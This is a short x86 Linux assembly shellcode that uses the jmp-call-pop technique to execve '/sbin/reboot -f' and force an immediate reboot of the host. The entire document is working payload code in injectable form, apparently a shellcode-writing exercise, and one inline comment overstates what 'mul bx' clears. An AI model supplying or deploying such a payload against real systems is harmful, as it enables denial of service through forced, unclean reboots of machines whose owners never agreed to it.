section .text

_start:

    jmp set             ; start jmp-call-pop trick 

init:
    xor ebx, ebx        ; set ebx to zero 
    mul bx              ; edx and eax are 0 
    pop ebx             ; ebx = reboot_string
    push edx            ; push 0 to the stack 
    push WORD  0x662d   ; push 0x662d ('-f') 
    mov eax, esp        ; eax = reboot_string -f
    push edx            ; push 0 to te stack
    push eax            ; push pointer to "-f"
    push ebx            ; push pointer to reboot string
    mov ecx, esp        ; *argv[] 
    push 0xb            ; execve syscall 
    pop eax             ; eax is ready for execve syscall 
    int 0x80            ; call execve 
    

set:
    call init           ; after call, ESP points to reboot_string 
    reboot_string: db "//sbin//reboot",0 
